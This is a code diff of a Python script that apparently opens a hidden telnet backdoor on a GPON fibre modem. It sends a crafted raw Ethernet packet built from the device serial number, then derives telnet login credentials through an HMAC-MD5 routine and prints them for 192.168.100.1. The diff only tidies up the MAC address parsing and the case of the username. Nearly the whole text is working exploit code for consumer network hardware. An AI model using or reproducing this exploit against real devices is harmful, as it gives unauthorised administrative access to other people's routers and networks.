@@ -15,7 +15,7 @@ rawSocket.bind(("eth_change_me", socket.htons(0xC199)))
 # create a ethernet packet
 # Fill in your modem mac and ethernet mac
 # See NetMgr sub_40A6D8
-MAC_DATA = struct.pack("!6s6s2s", b'\xE4\x8E\x10\xaa\xbb\xcc', b'\xaa\xbb\xcc\xdd\xee\xff', b'\xC1\x99')
+MAC_DATA = struct.pack("!6s6s2s", bytes.fromhex('E4:8E:10:DD:EE:FF'.replace(':','')), bytes.fromhex('AA:BB:CC:DD:EE:FF'.replace(':','')), b'\xC1\x99')
 
 if len(sys.argv) != 3:
         print(f"{sys.argv[0]} enable|disable GPONSN")
@@ -42,8 +42,8 @@ if( sys.argv[1] == "enable" ):
         payload = ( MAC_DATA + b'\xee\xee\x00\x00\x00\x00\xff\xff\xff\xff' + bytes(gpon_sn, "utf8")[::-1] +  bytes.fromhex("000000000000000000000000") + b'a'*32 )
 
 	# Note that i ran "#ONT/system/misc>admin_en set 1" before testing this so backdoor might not work unless you do it aswell, there might be a VOS_SendMsg in NetMgr call that enables it for you but thats for you to test...
-	telnet_usr = gpon_sn[0:4] + gpon_sn[4:12].lower() 	# Must be AAAAbbbbbbbb
-	pass_sn = gpon_sn.upper()				# Must be AAAABBBBBBBB
+	telnet_usr = gpon_sn[0:4].upper() + gpon_sn[4:12].lower() 	# Must be AAAAbbbbbbbb
+	pass_sn = gpon_sn.upper()					# Must be AAAABBBBBBBB
 	telnet_pass = vos_hmac_md5_ssh(pass_sn, 8)
 	print(f"Try login at 192.168.100.1\nUsername: {telnet_usr}\nPassword: {telnet_pass}\n")
 
